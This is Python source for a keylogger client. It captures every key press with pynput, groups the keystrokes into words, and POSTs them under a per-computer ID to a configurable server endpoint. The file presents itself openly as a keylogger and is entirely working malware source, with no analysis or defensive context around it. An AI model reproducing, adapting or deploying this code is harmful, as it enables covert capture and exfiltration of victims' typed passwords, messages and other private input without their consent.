import requests
import json
import uuid
from pynput.keyboard import Listener
import threading
import time
import os

# --- Configuration ---
SERVER_URL = "http://127.0.0.1:8000/api/keystrokes"

# --- Computer ID Management ---
# Paste your unique computer ID here
# Example: COMPUTER_ID = "a4d33a1e-b8a4-4712-9c3f-c301633519c6"
COMPUTER_ID = "b174b3bb-9ea2-4d1b-9176-0f405c629ef0"

# --- Keystroke Buffering and Sending ---
keystroke_buffer = []
BUFFER_SIZE = 10  # Number of keystrokes to buffer
buffer_lock = threading.Lock()

def process_and_send_words():
    """Processes buffered keystrokes into words and sends them to the server."""
    global keystroke_buffer
    with buffer_lock:
        if not keystroke_buffer:
            return

        words_to_send = []
        current_word = ""

        for item in keystroke_buffer:
            char = item['key']
            timestamp = item['timestamp']
            
            if char.isalpha():
                current_word += char
            elif current_word:
                words_to_send.append({'key': current_word, 'timestamp': timestamp})
                current_word = ""

        if current_word:
            words_to_send.append({'key': current_word, 'timestamp': time.time()})

        keystroke_buffer = []

    if not words_to_send:
        return

    payload = {
        "comp_id": COMPUTER_ID,
        "words": words_to_send
    }
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.post(SERVER_URL, json=payload, timeout=5)
            response.raise_for_status()
            print(f"Sent {len(words_to_send)} words to the server.")
            return
        except requests.exceptions.RequestException as e:
            print(f"Error sending words (Attempt {attempt + 1}/{max_retries}): {e}")
            time.sleep(1)

    print("Failed to send words after multiple retries.")

def on_press(key):
    """Callback function for key presses."""
    global keystroke_buffer
    try:
        char = key.char if key.char else " "
    except AttributeError:
        char = " "
    
    with buffer_lock:
        keystroke_buffer.append({'key': char, 'timestamp': time.time()})

    if len(keystroke_buffer) >= BUFFER_SIZE:
        threading.Thread(target=process_and_send_words, daemon=True).start()

# --- Main Function ---
def start_keylogger():
    """Starts the keyboard listener."""
    print("Starting keylogger client...")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
